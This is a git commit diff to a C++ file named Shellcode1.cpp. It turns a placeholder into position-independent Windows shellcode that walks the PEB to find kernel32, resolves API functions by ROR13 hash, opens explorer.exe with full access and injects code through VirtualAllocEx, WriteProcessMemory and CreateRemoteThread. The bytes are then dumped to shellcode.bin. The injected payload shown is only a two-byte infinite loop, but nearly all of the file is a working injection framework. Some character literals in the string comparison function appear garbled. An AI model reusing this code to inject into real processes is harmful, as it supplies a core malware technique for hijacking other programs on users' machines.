b9637a4b14db89303a74664d1eab8cd56648c015
yukar1z0e <44317939+yukar1z0e@users.noreply.github.com>
2019-11-02 10:00:37 +0800

    有bug

--- Shellcode1/Shellcode1.cpp
+++ Shellcode1/Shellcode1.cpp
@@ -1,15 +1,131 @@
-﻿// Shellcode1.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
-// 使用release模式。调试模式（至少在最近的编译器上）将以相反的顺序输出函数，并插入许多位置相关的调用。
-// 禁用优化。编译器会优化认为绝对没有使用的功能，这是我们绝对需要的。
-// 禁用堆栈缓冲区检查（ /Gs标志）。在函数的开头和结尾处调用的堆栈cookie检查器函数位于二进制文件中与位置相关的静态位置，因此，输出的任何函数都无法重定位且对于shellcode无效。
-
-#include <stdio.h>
+﻿#include <stdio.h>
 #include <Windows.h>
+#include <winternl.h>
+#include <wchar.h>
+#include <tlhelp32.h>
 
-void shell_code()
+PPEB get_peb(void);
+DWORD __stdcall unicode_ror13_hash(const WCHAR* unicode_string);
+DWORD __stdcall ror13_hash(const char* string);
+HMODULE __stdcall find_module_by_hash(DWORD hash);
+HMODULE __stdcall find_kernel32(void);
+FARPROC __stdcall find_function(HMODULE module, DWORD hash);
+HANDLE __stdcall find_process(HMODULE kern32, const char* procname);
+VOID __stdcall inject_code(HMODULE kern32, HANDLE hprocess, const char* code, DWORD size);
+BOOL __stdcall strmatch(const char* a, const char* b);
+
+void __stdcall shell_code()
 {
-	for (;;)
-		;
+	HMODULE kern32;
+	DWORD* dwptr;
+	HANDLE hProcess;
+	char procname[] = { 'e','x','p','l','o','r','e','r','.','e','x','e',0 };
+	char code[] = { 0xEB, 0xFE };
+
+	kern32 = find_kernel32();
+	hProcess = find_process(kern32, (char*)procname);
+	inject_code(kern32, hProcess, code, sizeof code);
+}
+
+HANDLE __stdcall find_process(HMODULE kern32, const char* procname)
+{
+	FARPROC createtoolhelp32snapshot = find_function(kern32, 0xE454DFED);
+	FARPROC process32first = find_function(kern32, 0x3249BAA7);
+	FARPROC process32next = find_function(kern32, 0x4776654A);
+	FARPROC openprocess = find_function(kern32, 0xEFE297C0);
+	FARPROC createprocess = find_function(kern32, 0x16B3FE72);
+	HANDLE hSnapshot;
+	PROCESSENTRY32 pe32;
+
+	hSnapshot = (HANDLE)createtoolhelp32snapshot(TH32CS_SNAPPROCESS, 0);
+	if (hSnapshot == INVALID_HANDLE_VALUE)
+		return INVALID_HANDLE_VALUE;
+
+	pe32.dwSize = sizeof(PROCESSENTRY32);
+
+	if (!process32first(hSnapshot, &pe32))
+		return INVALID_HANDLE_VALUE;
+
+	do
+	{
+		if (strmatch(pe32.szExeFile, procname))
+		{
+			return openprocess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
+		}
+	} while (process32next(hSnapshot, &pe32));
+
+	return INVALID_HANDLE_VALUE;
+}
+
+BOOL __stdcall strmatch(const char* a, const char* b)
+{
+	while (*a != '' && *b != '')
+	{
+		char aA_delta = 'a' - 'A';
+		char a_conv = *a >= 'a' && *a <= 'z' ? *a - aA_delta : *a;
+		char b_conv = *b >= 'a' && *b <= 'z' ? *b - aA_delta : *b;
+
+		if (a_conv != b_conv)
+			return FALSE;
+		a++;
+		b++;
+	}
+
+	if (*b == '' && *a == '')
+		return TRUE;
+	else
+		return FALSE;
+}
+
+VOID __stdcall inject_code(HMODULE kern32, HANDLE hprocess, const char* code, DWORD size)
+{
+	FARPROC virtualallocex = find_function(kern32, 0x6E1A959C);
+	FARPROC writeprocessmemory = find_function(kern32, 0xD83D6AA1);
+	FARPROC createremotethread = find_function(kern32, 0x72BD9CDD);
+	LPVOID remote_buffer;
+	DWORD dwNumBytesWritten;
+
+	remote_buffer = virtualallocex(hprocess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	if (remote_buffer == NULL)
+		return;
+
+	if (!writeprocessmemory(hprocess, remote_buffer, code, size, &dwNumBytesWritten))
+		return;
+
+	createremotethread(hprocess, NULL, 0, remote_buffer, NULL, 0, NULL);
+}
+
+HMODULE __stdcall find_kernel32(void)
+{
+	return find_module_by_hash(0x8FECD63F);
+}
+
+HMODULE __stdcall find_module_by_hash(DWORD hash)
+{
+	PPEB peb;
+	LDR_DATA_TABLE_ENTRY* module_ptr, * first_mod;
+
+	peb = get_peb();
+
+	module_ptr = (PLDR_DATA_TABLE_ENTRY)peb->Ldr->InMemoryOrderModuleList.Flink;
+	first_mod = module_ptr;
+
+	do {
+		if (unicode_ror13_hash((WCHAR*)module_ptr->FullDllName.Buffer) == hash)
+			return (HMODULE)module_ptr->Reserved2[0];
+		else
+			module_ptr = (PLDR_DATA_TABLE_ENTRY)module_ptr->Reserved1[0];
+	} while (module_ptr && module_ptr != first_mod);   // because the list wraps,
+
+	return INVALID_HANDLE_VALUE;
+}
+
+PPEB __declspec(naked) get_peb(void)
+{
+	__asm {
+		mov eax, fs: [0x30]
+		ret
+	}
 }
 
 DWORD __stdcall unicode_ror13_hash(const WCHAR* unicode_string)
@@ -37,25 +153,43 @@ DWORD __stdcall ror13_hash(const char* string)
 	return hash;
 }
 
-PEB:PPEB __declspec(naked) get_peb(void)
+FARPROC __stdcall find_function(HMODULE module, DWORD hash)
 {
-	__asm {
-		mov eax, fs: [0x30]
-		ret
+	IMAGE_DOS_HEADER* dos_header;
+	IMAGE_NT_HEADERS* nt_headers;
+	IMAGE_EXPORT_DIRECTORY* export_dir;
+	DWORD* names, * funcs;
+	WORD* nameords;
+	int i;
+
+	dos_header = (IMAGE_DOS_HEADER*)module;
+	nt_headers = (IMAGE_NT_HEADERS*)((char*)module + dos_header->e_lfanew);
+	export_dir = (IMAGE_EXPORT_DIRECTORY*)((char*)module + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+	names = (DWORD*)((char*)module + export_dir->AddressOfNames);
+	funcs = (DWORD*)((char*)module + export_dir->AddressOfFunctions);
+	nameords = (WORD*)((char*)module + export_dir->AddressOfNameOrdinals);
+
+	for (i = 0; i < export_dir->NumberOfNames; i++)
+	{
+		char* string = (char*)module + names[i];
+		if (hash == ror13_hash(string))
+		{
+			WORD nameord = nameords[i];
+			DWORD funcrva = funcs[nameord];
+			return (FARPROC)((char*)module + funcrva);
+		}
 	}
+
+	return NULL;
 }
 
 void __declspec(naked) END_SHELLCODE(void) {}
 
 int main(int argc, char* argv[])
 {
-	int sizeofshellcode = (int)END_SHELLCODE - (int)shell_code;
-
-	// Show some info about our shellcode buffer
-	printf("Shellcode starts at %p and is %d bytes long", shell_code,sizeofshellcode);
-
-	// Now we can test out the shellcode by calling it from C!
-	shell_code();
+	FILE* output_file = fopen("shellcode.bin", "w");
+	fwrite(shell_code, (int)END_SHELLCODE - (int)shell_code, 1, output_file);
+	fclose(output_file);
 
 	return 0;
 }
